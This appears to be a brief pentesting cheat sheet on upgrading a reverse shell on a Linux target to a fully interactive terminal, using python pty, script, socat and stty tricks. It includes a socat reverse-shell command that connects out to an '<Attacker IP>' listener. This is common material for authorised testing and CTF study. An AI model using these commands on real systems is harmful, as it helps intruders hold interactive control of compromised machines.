# Why am I here?
### Because I have a revshell from Linux target, now I upgrade its capabilities to become fully interactive
# Techniques
## Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
## Script trick

```bash
script /dev/null -c bash
```
## Socat

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<Attacker IP>:4444
```

# After these techniques:

## Bash shell in netcat - background the session

```bash
ctrl+z 
```
## Attacker's Terminal (Us):

```bash
echo $TERM
```

```bash
stty size
```
## Getting shell back

```bash
stty raw -echo; fg
```

```bash
export TERM=xterm-256color
```
-> Could be any other based on output of echo $TERM.

```bash
stty rows 27 columns 122
```
-> Row and column numbers depend on output of stty size.
